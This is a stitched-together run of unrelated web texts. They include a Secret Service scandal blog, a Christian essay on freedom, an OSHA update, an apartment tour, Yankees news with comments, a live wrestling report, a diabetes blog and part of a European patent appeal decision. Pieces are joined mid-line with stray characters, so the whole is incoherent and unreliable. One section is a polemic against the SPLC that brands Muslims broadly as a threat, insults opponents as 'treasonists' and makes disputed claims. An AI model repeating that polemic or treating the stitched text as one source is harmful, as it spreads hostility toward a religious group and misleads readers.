Please visit the
Dazzler Campaign
for more information, participating
retailers, a celebrity design album and press releases.
Sean's support for the National Osteoporosis Society (NOS) is inspired by
his grandmother's strong bones and her participation in osteoporosis research
at Sheffield hospitals.

Here's what we know so far -- 11 Secret Service agents were sent home from a summit meeting in Cartagena, Colombia after the U.S. Embassy discovered they allegedly had prostitutes in their hotel rooms. There was an argument about payment to one of the ladies, which got the hotel staff involved, who then called the U.S. authorities. The agents were immediately flown back to DC (they weren't on the President's detail, by the way) and have been placed on administrative leave.
Just when you thought this couldn't get any more embarrassing, there are now reports that some U.S. military personnel was also involved in the so-called "personal misconduct" in Colombia. Wonderful.
It's hard to imagine that Secret Service and some military officials could let their guard down enough to make such terrible, terrible decisions. They've been trained and have made a career out of being stand-up individuals who'd take a bullet for someone. To hear that they're messing around with prostitutes and getting into kerfuffles over paying said prostitutes is infuriating, to say the least.
I mean, patronizing prostitutes is one thing, but to do so while on assignment abroad is another. Their actions don't just reflect poorly on themselves, they reflect poorly on the entire nation. They've embarrassed the country.
And know something? I really don't think that's an over-statement. As an American, I'm ashamed. The higher-ups in Washington agree with me -- their swift action to deactivate these agents sent a clear message. Mess up, and you're out. The Secret Service agency has a no-tolerance policy; there are no second chances when you humiliate yourself, your employer, and your nation.
There are plenty of other agents, or agents in training, who understand that they represent something bigger than themselves, and I hope officials make an example out of the wrong-doers. Their actions were totally unacceptable, totally deplorable, and totally embarrassing.

Posted by John M. Njoroge on September 6, 2012
One of my professors divided the class into groups of five and asked us to decide which of the following three individuals had the most freedom:
(1) A person who is not able to sin,
(2) A person who is both able to sin and able not to sin, and
(3) A person who is not able not to sin.
Less than five minutes into the discussion, my group had concluded that the person who was both able to sin and able not to sin (person #2) had the most freedom. We correctly eliminated option #3 since a person who cannot help but sin is really in bondage. But the unanimity of the decision and the ease with which it was arrived at caused us to suspect that something was wrong. Why would we be asked to “discuss” such a “simple” question in a graduate seminar?
We had made two serious errors in our deliberation: we did not take into account the biblical meaning of “freedom” and we did not fully appreciate the nature of sin. Like most people, we thought freedom was the ability to do what one wanted to do—whenever, however, and wherever one chose to do it. Consequently, we reasoned that the person who had the most choices automatically had the most freedom. When I wondered out loud whether we really believed that a person who could sin had more freedom than God, who cannot sin, we found out why we needed some time to discuss the question.
Biblically speaking, freedom is the ability to function the way God designed us to function. This is the reason why freedom and truth are so intertwined; we need to know what our purpose and design are before we can exercise the freedom to fulfill our mission on earth. That is also true of things we ourselves make. A meticulously manufactured Ferrari which, I’ve been told, is a marvel on the road, is completely useless in the ocean. A hammer functions at its best when it is pounding nails, and a multi-million dollar piece of equipment made for space travel is useless to us unless we know its purpose. Similarly, we function at our best when our lives measure up to our Designer’s specifications. It is true that God’s purposes can be fulfilled even through people who reject God, but true freedom is found only in God.
Misunderstanding the kind of freedom Christ offers leads to a distorted view of the nature of sin. Some find it hard to give a good reason why sin is prohibited by God. Don’t God’s prohibitions limit our freedom? Wouldn’t some acts, at least, be harmlessly enjoyable if God, for some curious reason, did not brand them “sin”? The answer to both questions is no, and the reason is that sin is a serious defect in humanity, not a virtue. It will eventually turn those who relentlessly cling to it into grotesque distortions of God’s original intent for them. Anything that impedes our progress towards our true identity and calling diverts us from our journey to freedom, even when no one else finds out.
That is why it is not quite true to tell people that knowing the truth will set them free. That phrase is part of a very instructive discipleship statement in John 8:31-32 which reads, “To the Jews who had believed him, Jesus said, ‘If you hold to my teaching, you are really my disciples. Then you will know the truth, and the truth will set you free.'” Did you notice the conditional nature of the freedom proclaimed here? Only by holding to the teaching of Christ in the context of purposeful discipleship can true freedom be found. James 1:25 tells us that practicing God’s perfect law gives us freedom. Without a clear understanding of a call to freedom in Christ, any thirst for righteousness and passion for the lost will be seriously hindered, for we will secretly think that the requirements of righteousness are really deprivations.
No, I am not advocating works salvation. We are saved by grace through faith alone, but in the process of growth as believers, the light of the gospel must gradually shine on those areas of our lives that hold us back from fulfilling our true calling. When the gospel of Christ begins to chip away at those holdups, we learn what it means to be truly free and why it is prudent to hate sin. John Witherspoon was right. In his sermon on the first Thanksgiving Day called after the war for independence in the U.S., he declared, “A republic once equally poised must either preserve its virtue or lose its liberty.”(1) Whether for an individual or a sovereign nation, truth and virtue are the rails upon which the wheels of freedom roll.

OSHA Updates
OSHA has just (at last!) released its final regulation updating their Hazard Communication Standard. The document in question is 858 pages long, so we here at EH&S have not yet slogged through its entirely just yet. Still, though it does not directly affect the Lab Standard (which covers lab people only), some of its requirements will definitely be noticed by lab users. The changes in the regulation are designed to bring the USA regulation in sync with the world-wide system of hazard warnings, called the Global Harmonization System (GHS).
First of all, you can soon be expected to see Safety Data Sheets, instead of Material Safety Data Sheets. The formats used on the sheets will also become more uniform from manufacturer to manufacturer. Otherwise, they will look the same as the MSDS do now.
There will also be new hazard symbols present on the Safety Data Sheets, which will match those used in the rest of the world. Here are some of the symbols-most of the meanings should be obvious to you.
Finally, there will be one special area of confusion. It is unfortunate that our current system of hazard rating (as you all well know) lists "4" as the highest hazard and "0" as little or no hazard. Sadly, the GHS system is nearly the opposite: A "5" is a "minimal hazard" going down to a "1" as a "severe hazard". Frankly, we are not looking forward to the problems this will be causing, but we will work with all of our campus to ensure that confusion is minimal. Look to this newsletter for further updates. There is fortunately a fairly lengthy time frame for compliance with the new law.

The moment we walked into Peter's apartment we were struck by the wall of light emanating from the space's gigantic windows. Well, actually it might have first been the homemade "Mr. T" duct tape portrait that struck us... then the horizontally mounted Ikea mirrors in the front hallway. As it turned out, though the layout and design of the place were top-notch, we couldn't help but be sidetracked by all the thoughtful details that had been worked in to the space...
From big projects to small space-saving solutions, there are clever, creative ideas all over. Notice the kitchen island, which on closer inspection is actually two shopping carts on end, fronts cut off and welded together. Or the jigsaw tables in the living area, a DIY project that can be easily reconfigured to form anywhere from four tables to one. On a smaller scale, the magnetic spice jars attached to the microwave save space and add a few little pops of color. Also, Peter's DVD player is housed in a drawer below the TV, effectively cutting out any clutter, and his "gym" is easily stored in a nearby bookshelf. These things add up and contribute greatly to the open, balanced feeling of the home.
Judging by these creative solutions, it may come as no surprise that Reis is from a family of artists (sister Klari's artwork can be seen throughout the house), and though Peter began his career in tech sales, he's now starting a consumer products company to put his creativity and design interest to further use. We just hope there's a home decor line in the works!

My style: I try to follow some of the tenets of good logo design. Clean. Balanced. Everything having a reason for being there.
The inspiration for my home: George Hauser (architect of the building), Orla Kiely, Warhol, Rocky III. Maybe some OCD.
Favorite element: Invisible Gym:
- Pull-up bar that blends with decor
- SelectTech dumbbells (great space saver)
- Exercise ball doubles as work chair
Biggest challenge in designing my home: Being patient. Waiting for a sale or for a desired item to pop up on Craigslist
What friends say about my home: “I like the colors.” “Are those shopping carts?”
Biggest embarrassment in my home:
- Purchasing shampoo/conditioner based on whether or not it matches the decor.
- Not completely painting under the bathroom sink (only visible from a...uh...certain angle)
- dead plants on the patio
Proudest DIY: Coffee Table(s)
Biggest indulgence with respect to my home: Definitely the headboard.
Best advice given or received:
“Buy fewer items, but of high quality.”
“Buy heavy things.”
“Make your bed.” - Mom
Dream source for stuff: Limn

I always knew that this was true, true at least to my own prejudices, but someone’s now gone and actually proven it. We’re often told that bureaucracy in hte spending of public money is neccessary, and essential manner of protecting the taxpayers’ funds. But it can be that the cost of the bureaucracy doing the protecting is higher than the value of the protection:
…we show that the $40,000 (Canadian) cost of preparation for a grant application and rejection by peer review in 2007 exceeded that of giving every qualified investigator a direct baseline discovery grant of $30,000 (average grant).
The bureaucracy used to filter the funds to those researchers deemed worth exceeds the costs of simply giving the money to all researchers that apply.
Which leads to an interesting game that can be played. What we see here is that the cost of administration is higher than the produce of that administration. We’re not saying that “frontline services” need to be cut, not at all. We’re purely stating that at times and in places the cost of selecting who gets the public money and how is so high that we can simply dole it out without doing any such selecting. We’ll get, in fact, more front line servies (in this case research) for the same money. The only people who would lose are the administrators themselvesand we’ll all weep a bitter tear for them now, won’t we?
The game is of course to see which other similar bureaucracies we think we could abolish and get this benefit from. More services for the same money?
As a start I would propose the Regional Assemblies. Large numbers of the quangos (The Dairy marketing bods for example, the Arts Council maybe?). Much of the NHS oversight panels and management boards. The BERR.
Well, make your own lists, this really could be a game for all the family. Which parts of the bureaucracy would make us better off by their abolishment?

I am not going to lie, I am a little nervous that the update will take away some of the romantic, old Hollywood feel. Take a look at the before and after photos!

I do know that the hotel is still pink and they kept the swans...thank god!

“Early in the discussions, they made it clear they really wanted me,” said Ellsbury, who signed a seven-year, $153 million deal with an option for an eighth season. “That’s when things moved really fast.”
And after winning two World Series titles with the Red Sox, Ellsbury will move to The Bronx and try to duplicate that success.
“The biggest thing I’ve always enjoyed is the expectation of winning,” said Ellsbury, who will wear No. 22 after wearing Derek Jeter’s No. 2 with the Red Sox. “We had that in Boston and we have that in New York.”
Yankees manager Joe Girardi offered a rosy outlook on Ellsbury’s defection: “You’re no longer a thorn in our side. You’re a flower in our clubhouse.”
Ellsbury said the compression fracture in his right foot that bothered him in September and the postseason was healed and he’s confident he will remain healthy throughout the length of the contract despite having been hurt before.
“I play the game hard, I feel like the right way,” the 30-year-old outfielder said. “I give everything have.”
Will Ellsbury win another World Series with the Yankees?
Is hustle time...
Carl Crawford part 2
Why are Red Sox fans always roaming the NYPOST and spreading their hopes while showing their sorrows and worries?
Grandy man... here is what Ells said on this day going from Boston to NY. " “We had that in Boston and we have that in New York.” .. That's the area of comment you should have expressed in your change to the Muts.
Yank fans will love Ells .. running around the Bases in Fenway, and in YS. Good luck Ells. Show Cano how to Hustle as a Pin striper.
Good luck to you guys,he will NOT be playing on opening day this year.
He played hard in this off season knowing teams would be looking at him. Now he has his contract, he can now go back on the DL. He'll be a bust.
Bad signing by the Yankees too much money for someone who had one good season.
@USMCBXBomber Great point. One doesn't pump up your new team by denigrating the old. Classy for Ellsbury. Grandy never learned that. Ready, fire, aim. Oops.
@NYFAN Everybody is getting too much money, definitely too much money but a need and now even though I love Gardner we have a pice that many other teams want, as you can see the Reds offered Phillips straight up for Gardner... Baseball is inflated and Cano got way too much money, Bartolo Colon got 20 million for two year, Phil Hughes got 8 million a year, It's all inflated but with that being said we have a great leadoff hitter, that will hit 300 and have 50 stolen bases every year, and in Yankee stadium his power number of 2011 will be back a bit, You forget he shouldve won the MVP 2 years ago.... Good signing, wish we couldve had him for less, but that's the nature of the beast right now...The subversive and anti-American SPLC is back at it again. You almost have to wonder how much the uber-left communist group, Southern Poverty Law Center, is getting paid to shill for Islamic supremacism. America, these useful idiots are one of the many weapons in the arsenal of our mortal enemies.
Under the comically ghoulish title, "Jihad Against Islam," Mark Potok and his well-paid treasonists have taken up against those fighting for freedom, individual rights and equal protection under the law. They have named me one of the top 10 anti-Muslim hardliners profiled in in their latest [anti-]Intelligence Report. (Others include David Horowitz, Robert Spencer, David Yerushalmi, Brigitte Gabriel, and John Jay ....).
These are Media Matters memes that have been rebutted time and time again, but they have no real argument, so they propagate their lies. Rebuttal page here.
IN HER OWN WORDS "Islam is not a race. This is an ideology. This is an extreme ideology, the most radical and extreme ideology on the face of the earth."
— On Fox Business' "Follow the Money," March 10, 2011
"No, no, they can't. … I don't think that many westernized Muslims know when they pray five times a day that they're cursing Christians and Jews five times a day. … I believe in the idea of a moderate Muslim. I do not believe in the idea of a moderate Islam. I think a moderate Muslim is a secular Muslim."
— Quoted in The New York Times, responding to a question as to whether devout practicing Muslims can be political moderates, Oct. 8, 2010
"In the war between the civilized man and the savage, you side with the civilized man. … If you don't lay down and die for Islamic supremacism, then you're a racist anti-Muslim Islamophobic bigot. That's what we're really talking about."
— Quoted in The New York Times, Oct. 8, 2010
Potok and his paid stooges never met a jihadi they didn't like. The SPLC doesn't even have a category for Islamic jihadi groups or Muslim Brotherhood groups, whose stated goal (according to an internal, captured document) is to eliminate and destroy Western Civilization from within. The greatest threat facing our nation, our people, our world, and they are shilling for them and smearing those of us who are fighting for the preservation of our freedom.
SPLC Intelligence Report: Cadre of Hard-Core Activists Fueling Resurgence of Anti-Muslim Hate
A decade after the Sept. 11, 2001, terrorist attacks, a second wave of anti-Muslim hatred is being propelled by a small cadre of activists who are exploiting Americans' fears of Islamic extremism, according to the latest issue of the Southern Poverty Law Center's Intelligence Report, released today.
In the wake of this hysteria, anti-Muslim hate crimes have been reported across the country, protests have been launched against mosques, and lawmakers in more than a dozen states have introduced legislation to ban the use of Islamic religious law, called Shariah, in the U.S. legal system – a completely unfounded fear.
"We've seen a remarkable resurgence of anti-Muslim hatred around the country," said Mark Potok, editor of the Intelligence Report. "Unlike the first and far more understandable wave that followed the Sept. 11 attacks, however, this one was largely ginned up by politicians and commentators pandering for votes and ratings. It's been a despicable exercise in Muslim-bashing for personal benefit. While there are legitimate concerns about terrorism, the rhetoric we've been hearing aims to demonize all Muslims."
Nonsnese. According to FBI statistics, "anti-Muslim" hate crime is at an all-time low. More promotion of the Islamic supremacist imperative to shut up and shut down the kuffar.
This issue of Intelligence Report also includes an interview with former Department of Homeland Security (DHS) analyst Daryl Johnson, who says that the department has effectively gutted a unit that analyzed the terrorism threat from right-wing extremists. That action came in response to a 2009 DHS report on domestic extremism that was wrongly criticized as tarring all conservatives as potential terrorists. Johnson, who describes himself as a conservative Republican, was the principal author of that report.
If Johnson is a conservative, I am a hafiz.
The cover story, titled "Jihad Against Islam," recounts recent incidents that strongly suggest a spike in anti-Muslim hate crimes. In May 2010, for instance, a bomb exploded at an Islamic center in Jacksonville, Fla. In August, a man slashed the neck and face of a New York taxi driver after finding out he was a Muslim.
More lies. The slasher was a leftist who was affiliated and working with the organization behind the Ground Zero mosque. More SPLC lies and obfuscations. We need a list of SPLC donors, so that they know that their money is being spent to destroy truth tellers and American heroes.
Four days later, someone set fire to construction equipment at the future site of an Islamic center in Murfreesboro, Tenn. This March, a radical Christian pastor burned a Koran in Gainesville, Fla., leading to deadly riots in Afghanistan that left at least 20 people dead.
Yes, blame the Pastor, not the murdering jihadis.
At the heart of this vilification of Muslims – a group that comprises less than 1 percent of the U.S. population – have been activists such as Pamela Geller, co-founder of the anti-Muslim hate group Stop Islamization of America. Geller led the protest against a proposed Islamic cultural center in New York City, deriding it as a 9/11 "victory mosque" that would be two blocks from the site of the former World Trade Center. Geller is one of 10 anti-Muslim hardliners profiled in this issue of Intelligence Report.
Politicians have added fuel to the fire. At the state level, legislators have stoked unfounded fears of Shariah law infiltrating U.S. courts. At the national level, U.S. Rep. Peter King of New York last week held the second of his controversial hearings on the radicalization of American Muslims. King has said there are "too many mosques" in America, claiming without evidence that 80 to 85 percent of mosques are controlled by fanatical extremists.
An intensive five-year study isn't evidence? Four separate studies, conducted in 1998, 2004, 2008 and 2011 aren't evidence? Where are the studies debunking their findings, which all independently confirmed what King said? The left discards concretes, rebukes reality, in favor of its bias, assumptions and agenda.
Similarly, last August, U.S. Rep. Louie Gohmert of Texas took to the floor of Congress to warn of Muslim women being brought to the United States to birth terrorists, though he was unable to provide evidence of such a plot.
Citizen protests also have challenged perfectly legal mosque or Islamic center construction projects in New York City; Murfreesboro, Tenn.; Temecula, Calif.; Sheboygan, Wis.; and elsewhere.
And let me warn you, SLPC, CAIR, ISNA, ICNA, MAS: they will get bigger, more broad-based, and more widespread.
The first wave of anti-Muslim sentiment that occurred after the 2001 terrorist attacks was effectively tamped down by President George W. Bush's efforts to make clear that terrorism, not Islam or Muslims in general, was the nation's enemy. That effort by a conservative president, coupled with military action in Iraq and Afghanistan – actions that Americans may have considered an adequate response to the terrorist attacks – largely neutralized efforts to demonize Muslims in the United States.
Bush got a lot wrong, but that for another day.cfgb
This is a different edition of Bits And Bites from the norm. I was live at
RAW last night - so I probably won't be as opinionated as usual, and in more
of a "wow, that was COOL" mode.
Also, I include Metal spoilers so you MAY want to skip over the area where I
issue a BIG WARNING.
Our day started off by managing to hawk the extra tickets we had on us for a
relatively inexpensive price. My mother was kind enough to drive into Ottawa
to supply myself and Brooks with Bristol board (well, she was there for OTHER
reasons) to make HILARIOUS signs for the arena. Nothing we did got on TV as
far as we can tell though. One of our signs was a jumble of various stuff
that we could giggle at. (nWo, Koko B. Ware, TANK Rules, Jake Roberts for
P.M., Bring Back The Hennigplex, JUVI!, We Need More "Meat", Horace + Virgil
= Unstoppable, Norman Makes Me Wiggle, SID, The Shooter Dean Malenko Rules,
Bring Back 3 Count) The other one didn't make it on TV as hard as I tried,
reading CANADA LOVES CRZ - DEPORT SCOTT KEITH.
The other thing we attempted to get into the arena was a large sheet with nWo
written on it which we would drape down, as we were in the first row of the
second deck. HOWEVER, the moment we started to drape it security asked us if
we could please remove it. I have NO idea what was up with that, but they
didn't take away our other jumbled mess which also included nWo, so I'm not
exactly sure what the problem was.
Brooks and I were in decidedly pro Alliance on this evening - which probably
comes as no surprise to anyone who knows me at all. While I appreciate what
the WWF does - I have NEVER been a big WWF supporter. I watch 'cause it's
wrestling but my heart belongs to WCW.
Anyway, we got settled, The Fink gave out a few Gameboys, which I thought was
MUCH better set up than WCW did theirs a few years ago. I went to Mayhem '99,
and Dave Penzer gave out a bunch of somethings (I've forgotten) to people
sitting IN THE FRONT ROW AREA. The 3 Gameboys last night were given to 1
person in each deck. So congrats to the person who shelled out next to
nothing and went home with a Gameboy!
WARNING - THE FOLLOWING SECTION CONTAINS SOME METAL SPOILERS
CRASH HOLLY def. STEVEN RICHARDS. I'll be damned if I can remember WHAT Crash
won with - but I certainly remember the match taking place. Kronik's music
hit and it immediately had me looking hard at the rampway. I had forgotten
Steven Richards was using that theme. Crash Holly got a REALLY big pop from
the crowd which shocked the hell out of me. There was a Stevenkick that
resulted in a whole lotta "oooh's" from the crowd, but he kinda stood around
waiting for Crash to get up and pin him.
ALBERT def. TOMMY DREAMER. Albert and Tommy both got pops. I don't think
anyone really cared a whole lot about the result of this one (which in my
mind was never in doubt), but the Baldo Bomb certainly looks impressive live!
SATURN def. CHUCK PALUMBO. Brooks and I were there for ya Chuck! Saturn's pop
scared me, and at this point I was really digging the crowd. I mean, if it
was from the WWF, they popped, and popped big. A Moppy chant broke out and
Saturn seemed touched. Saturn nailed a Three Handled Moss Covered Family
Gredunza for the win. I don't think the fans were aware that was his finisher.
KAIENTAI def. JUSTIN CREDIBLE and RAVEN. The Alliance is 0-4, Chris is
getting uneasy. Kaientai's pop was the loudest of the night so far. Both
Funaki and TAKA played the face in peril at various points in the match. This
match was REALLY good. Oh, and to the guy who wrote the HOLT report for the
Torch, Raven DID NOT get a big pop, he was not really over, and you're simply
an ECW mark who hears what he wants to hear. Ahem.
MIKE AWESOME def. SCOTTY II HOTTY. The Alliance is on the board! I had
honestly given up on seeing a win for our side tonight, and did not expect
Mike to take this one. Scotty hit The Worm and Awesome actually kicked out.
(Yeah, he kicked out of a chop that takes 5 minutes to execute, THAT'S
believable!) Scotty came off the top rope and Awesome caught him with a rough
sounding powerslam! Good ending. Scotty waved to the fans while selling the
sore back on his way back up the ramp.
TEST def. BILLY GUNN. Crowd was kinda split with Test, but cheers seemed to
overpower the boos here. Gunn was more or less split until the match began.
Test took over the heel role - and the fans remained split on him but
supported Gunn without hesitation. Gunn took a Big Boot leading to
another "Ooooooh" and Gunn loses. It was pretty solid.
THOSE PUNK KIDS def. KANYON and HUGH MORRUS to retain the WCW World Tag-Team
Titles. As soon as they said the match was for the WCW tag-team titles, I
turned to Brooks and warned him to cover his ears from the squeals. I swear
to god, about 5 underage chicks dressed in hippie style gear ran down the
stairs to shoot pictures of them as soon as their music hit. A Lita chant
broke out. The cheating bitch attacked Hugh on the outside with a
hurricanrana. Hardys retain, and it's one that should look pretty good on
television.
Anyway, for the rest of the show I'll use my tape to aid me recall more than
I could on the dark matches.
By the way - about 10 minutes before we went on the air, we were told we were
going on the air so cheer and hold our signs up. Does TNN air a live crowd or
something announcing "RAW is next"? (Yes - I always recap it, too! Don't you NOTICE? :( - CRZ) Or was that footage simply for TSN to air
incase a woman gets put through a table or something? Help me out readers!
Damn those fireworks are loud in person. Especially when you're sitting
parallel to them.
It's Commissioner Mick Foley! Hey, he may come off as annoying on TV, but he
was great to see live. The segment REALLY went nowhere - but I wasn't
particularly annoyed. I'd have lost it for sure if I was recapping the TV
show, but tonight the WWF could do no wrong! Someone help me, I'm a sheep.
Does this mean Trish Stratus is off Excess? (Don't YOU recap that show?) Shut
up, I'm GETTING to it!
Austin announces a vote for later tonight. It was the first sign of Austin
which got boos, and the first sign of RVD for a crowd that was completely
frothing at the mouth for him. I'm not kidding, about a dozen RVD chants
broke out throughout the evening. WWF, you have your new monster face!
The Acolytes introduce Nidia to a crowd who probably have no idea who she is.
We didn't get Tough Enough until last night up here. Hurricane pulled away
the APA's office, which got a laugh. Bradshaw's "Stand back, there's an ass
kicking coming through" got a BIG cheer.
Dudleys get a pop. Maybe I was too far away - but Stacy looks better on TV in
my opinion. That's not to say I'd rather hump my television screen. I made a
little noise for the Show, and so did the crowd. My GOD that is a big man! I
heard all kinds of people around me say "Big Show, get the table" when he was
getting the table. Not in unison, but one after another, probably repeating
one another. The mist/Chokeslam spot was neat.
Austin tosses out Debra's vote.
Alright, now we're talking! Here comes The Alliance. This was one of my
highlights of the night! A few minutes into the talking, Justin Credible went
running off to the back. RVD joined them in the ring shortly after. Fans were
REALLY laying into Stephanie - thank GOD I wasn't alone. Why is Regal the WCW
commissioner? That bothered me at the show. Don't Shane and Steph book
matches now as it is? Willie made some great faces however. Austin working
the votes was well done. I kept hoping SOMEONE ELSE was going to get a vote.
Bullshit chant breaks out - but I certainly was not adding any fuel to that.
Brooks asked who I thought Angle's partner was. I answered with "Undertaker"
without hesitation. Hey, one of my predictions was right, imagine that!
Hurricane gets a disgustingly far too loud pop. I saw 2 people dressed as The
Hurricane during the show as well. Does it have to be THIS gimmick that's
catching on? His new music is a huge step up. I got to see Ron and John live,
my life is complete! Jackie looked really good from a wrestling standpoint -
better than a number of guys I saw. The Clothesline From Hell looked
UNBELIEVABLY nasty and I'm sure glad *I* wasn't on the receiving end of that.
Billy Kidman is a rat. I didn't notice Kanyon at the show - and had CRZ not
mentioned him in his recap I may not have. VERY interesting though. I suggest
they keep doing it. If it leads anywhere, the WWF can have footage of Kanyon
lurking in the background all the time.
Does Kurt have a partner. Sure enough, it's Undertaker. (Depush that man!)
But the fans ate him up, almost on RVD's level.
Jericho's speech about the eyebrow and the pastry nickname was good. Rocky
appearing on the scene lead to a huge "UH OH!" from the crowd. A few boos,
but more cheers. Stay out of The Rock's way. Jericho was definitely the
babyface tonight.
Jericho joins us on commentary. I realize the title is defended 24/7, but
will RVD ever defend the title? The same fans who were booing Rocky 10
seconds ago are cheering him now. Fans were split RIGHT DOWN THE MIDDLE for
whom to cheer for though. Wow, the Rocky Sucks chant was louder than I
thought it came across! About 2 minutes later though, Rocky chants were there
again which may be why it didn't seem like it was THAT bad! I didn't even see
Rhyno until he was in the ring and Brooks was saying "Rhyno's in the ring
man!" Jericho not helping Rocky was really cool!
Stephanie yells. I honestly don't remember Stephanie from last night too
well - shows how much I pay attention when she's on.
Tazz comes out - and I'm shocked it wasn't for the Cruiserweight Title,
considering Tazz is a midget and all. Turns out he's 240 some odd pounds, go
figure. Fans weren't into this one - however the way the WWF markets their
shows there was no entertainment to go with the sportz. Ha! JR apologized for
WCW in Canada. Go to hell JR!
Ahhh, the Rhyno / Jericho match WAS non-title - I missed that at the show and
wasn't sure. JR says the atmosphere in WWF New York is undescribable. I bet
he's never been. The Rock Bottom did NOTHING to impress the crowd. This feud
is on fire! Interesting to note, because it didn't appear on TV - but Mike
Awesome fell through the ropes and didn't catch anything on the way down. He
appeared to land on his tailbone - and while he walked off okay it looked
painful.
At this point I was wondering if we'd see Edge and Christian tonight.
Fans cheered for DDP, and turned on him in about 2 seconds.
There's Edge. His new music is really good stuff - I don't think I've
mentioned that in the past. He's on Excess this week. Good. I still have no
idea who was on last week, I haven't looked at the tape. Edge is fighting X-
Pac. I swear, I was the ONLY person in the building happy to see him. OH,
seeing Teddy Long reminds me of something cool. Everytime he came out during
commercial, he'd get a "Teddy" chant. He acknowledged the fans for doing so -
I was surprised! The 1, 2, 3 chants were coming from about 5 fans - but I
guess it was close to the microphone so it sounded like a few more. When JR
got up to talk to Edge, I thought the cameras were off at this point and
thought something was really wrong!
Why did Christian have to join the Alliance? This seems to be the only way of
turning full fledged heel anymore, which is sad and ridiculous writing.
The main event rolled around, and I was completely worn out by this point.
Still, I did my best to stay as into this as possible - because I've been a
HUGE Booker T fan for years now. The only time I saw him wrestle live, he was
a last minute substitute for Rick Steiner against Scott Hall for the US
Title. At least, I'm pretty sure it was the US Title, it could have been for
the TV Title for all I know - Scott Hall had both at the time. Anyway, the
match was fantastic and fast paced. Not a whole lot of stalling or anything
like that and ANYONE who dares tell me that Undertaker is lazy and useless
after seeing him in action myself is going to get a verbal lashing. I got a
chance to watch him go and he moves a helluva lot faster than he's given
credit for. I WAS disappointed I didn't see a Last Ride or Old School. I
ESPECIALLY wanted to see Old School because high flying is just THAT MUCH
COOLER when you see it first hand. The Five Star Frogsplash on Angle was
awesome and I can't imagine flying that far myself. Impressive stuff! I guess
that's why he's the professional and why I'm the lowly writer. :-)
After the show Angle simply walked to the back.
Anyway, even if I would normally perceive this as the worst RAW ever (I can't
tell - watching it on tape just reminds me of being there live) I don't care.
I LOVED IT and wish they'd come to Ottawa more frequently than once every 4
years.
I know this is a change in the normal format. I'll be back on Thursday with
the regular watching and commenting.

All signs that signal a panic attack.
All signs with which I am quite familiar.
Overwhelmingly, my panic attacks occur with work stress or uncomfortable social situations. Once in a while, a family situation creates enough anxiety for a panic attack to occur.
Yesterday was different. Yesterday it was about diabetes.
With an upcoming endocrinologist appointment looming, much thought has been going into questions to ask regarding recent weight gain and sharply increased fasting blood glucose readings. And that includes wondering if it is time to try metformin again.
Metformin, the wonder drug that did little wonder for me, other than making me wonder why I kept taking it despite being sick more days out of the month than not.
Even if metformin is not the answer, there are oral medications as well as injectables that can produce similar gastrointestinal side effects.
Which leads me to the bathroom at work. One bathroom, up to ten people who are in the office on any given day. At least twice per day, I cannot use the bathroom when I (or my bladder) would like. And when there is an emergency situation that could potentially turn embarrassing, one just hopes the bathroom is empty.
What does that mean? It means I cannot risk getting sick at work like I did when we had several bathrooms available.
That is what led to yesterday’s panic attack after not being able to use the bathroom before I left for the day.
Fear of being placed on an oral medication or an injectable that makes me sick, that embarrasses me, that makes me avoid leaving the house. I have been there, done that – and I just do not want to do it again.
Diet and exercise are not enough anymore. Unless my A1C has shot up from last time (5.8%), I doubt insulin would be an option with insurance coverage even if the endocrinologist decides to support it. Sulfonylureas and other medications that stimulate insulin production are not completely out of the question, though the endocrinologist is wary of frequent hypoglycemia with such drugs. What else is there but medications that could make me sick?
All I can do between now and next Tuesday is breathe and relax. No negative thinking. It will be okay. There must be a solution out there. There has to be.Summary of Facts and Submissions
I. The mention of the grant of European patent No. 0 169 723 based on patent application No. 85 305 186.0, filed on 22 July 1985 and claiming a priority of 24 July 1984 (GB- 8 418 778), was published on 11 January 1989.
The granted independent Claims 1 and 9 read as follows:
"1. A method of treating a plurality of zones of a processing line with a liquid, the liquid comprising a treatment liquid and a carrier liquid, characterized in that the treatment liquid is introduced as discrete slugs into pipes conveying the carrier liquid to each zone, and that the volume of each slug is selectively variable or that the slugs are introduced into each pipe at a selectively variable frequency.
9. An apparatus for treating a plurality of zones in a processing line with a liquid, the liquid comprising a treatment liquid and a carrier liquid, the apparatus comprising:
a source of treatment liquid (1);
a source of carrier liquid (2);
a plurality of pipes (8) conveying the carrier liquid to each zone; and
means (19) for introducing the treatment liquid into each pipe in discrete slugs of a selectively variable volume or at a selectively variable frequency."
II. The Respondent (Opponent) filed an Opposition on 11 October 1989 requesting the revocation of the patent for reasons of lack of novelty and lack of inventive step having regard to the disclosures of inter alia
D1: EP-A-0 079 152
D2: US-A-4 196 748
D4: GB-A-2 026 729
D7: ECO-VAC 1000, Chemical Dispensing System, Economics Laboratory Inc., Impressum 17075/3600/0185 (available to the public prior to July 1984 according to the statement by Mr Richard J. Mehus in the Affidavit of 26 November 1990 filed with letter of 6 December 1990).
III. By a decision of 8 February 1991 the Opposition Division revoked the patent. The Opposition Division held that the subject-matter of the independent Claims 1 and 9 was novel but lacked an inventive step in view of the combination of the teachings derivable from D2 and D4.
IV. An appeal was lodged against this decision on 27 March 1991, the appeal fee having been paid on 21 March 1991. The Statement of Grounds of Appeal was filed on 7 June 1991.
V. In a communication issued together with the summons to oral proceedings as auxiliarily requested by both the Appellant and the Respondent, the Board expressed its provisional opinion according to which the teaching of D2 could not be interpreted as disclosing an introduction of treatment liquid in the form of discrete slugs such as defined in Claim 1 of the granted patent.
Moreover even having knowledge of D4 it would not appear to be likely that the skilled person would combine its teachings with those of D2 because D2 and D4 essentially relate to mixing in order to obtain a homogeneous solution whereas the patent in suit proposes to keep the treatment liquid concentrated as a "package" up to the end of the pipeline.
However, the Board questioned whether the claims clearly set out the essential features of the invention even taking into account proposed amendments in three then valid auxiliary requests which moreover did not appear to be supported by the original disclosure.
As regards an alleged substantial procedural violation for not granting requested oral proceedings, the Board was of the provisional opinion that the formulation "The patent proprietors reserve the right to oral proceedings" could not be held to be a request for oral proceedings in accordance with Article 116 EPC.
VI. With the letter of 4 August 1992 the Appellant withdrew his request for oral proceedings and informed the Board that he would not be represented at the oral proceedings.
He formulated his definitive requests which read as follows:
1. Main request: maintenance of the patent in its granted form.
2. 1st auxiliary request (former 2nd auxiliary request):
Maintenance of the patent in its granted form with the amendment at line 6 of Claim 1 and line 10 of Claim 9: "which slugs remain at least partially discrete downstream of the introduction point".
3. 2nd auxiliary request (former 3rd auxiliary request):
Maintenance of the patent in its granted form with the introduction of the features: "the slugs, upon discharge at least at one zone, have a peak concentration substantially higher than the concentration of a homogeneous solution of the treatment liquid in the carrier liquid in the pipe" into the independent Claims 1 and 9.
